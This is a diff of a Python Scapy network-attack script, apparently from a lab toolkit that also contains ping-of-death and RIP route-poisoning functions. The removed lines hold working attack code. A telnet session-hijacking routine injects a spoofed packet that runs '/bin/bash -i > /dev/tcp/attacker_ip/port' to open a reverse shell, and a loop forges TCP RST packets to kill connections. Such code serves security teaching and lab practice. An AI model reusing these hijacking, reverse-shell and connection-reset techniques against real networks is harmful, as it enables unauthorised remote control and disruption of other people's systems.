@@ -237,54 +237,6 @@ def ping_of_death():
         sys.exit(1)
 
 
-def tcp_reverse_shell():
-
-    IFACE = "eth0"
-
-    attacker_ip = "192.168.222.10" # attacker's IP
-    attacker_port = 6969 # a (not already used) port of your choice
-    victim_ip = "192.168.223.10" # the IP of the user receiving the telnet connection (server)
-
-    REVERSE_SHELL = f"\r/bin/bash -i > /dev/tcp/{attacker_ip}/{attacker_port} 0<&1 2>&1\r"
-
-    def automatic_hijacking():
-        print("*** Hijacking Automatic Mode ***")
-        print("Start sniffing...")
-        sniff(iface=IFACE, filter="tcp", prn=_hijacking)
-
-
-    def _hijacking(pkt):
-        if pkt[IP].src==victim_ip and Raw in pkt:
-            print("Got a starting of a session, hijacking... ", end="")
-            # you have to get the size of the data field to update SEQ and ACK.
-            # this value is generally 1 since telnet sends one character at the time
-            # but sometimes it is different (for instance, 2, if also \r is sent)
-            tcp_seg_len = len(pkt.getlayer(Raw).load)
-
-            ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
-            tcp = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="A", seq=pkt[TCP].seq+tcp_seg_len, ack=pkt[TCP].ack+tcp_seg_len)
-            data = REVERSE_SHELL # use this to create a full reverse shell
-            pkt = ip/tcp/data
-            send(pkt, iface=IFACE, verbose=0)
-            print("done.")
-            exit(0)
-
-    automatic_hijacking()
-
-def tcp_reset():
-
-    def callback(pkt):
-        if pkt[TCP].flags != "S":
-            ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
-            tcp = TCP(sport=pkt[IP].dport, dport=pkt[IP].sport, flags="R", seq=pkt[IP].ack, ack=(int(pkt[IP].ack)-1))
-            pkt = ip/tcp
-            ls(pkt)
-            send(pkt,verbose=0)
-
-    while True:
-        pkt = sniff(iface='eth0', filter="tcp", prn=callback)
-
-
 #how to create this attack: we want to prevent the Kali Client host from reaching the internet, so we'd have to scramble the RIP entry for the routers R1, R2, R3, R4 which are the 
 #routers not directly connected to the Kali host. 
 def RIP_attack():
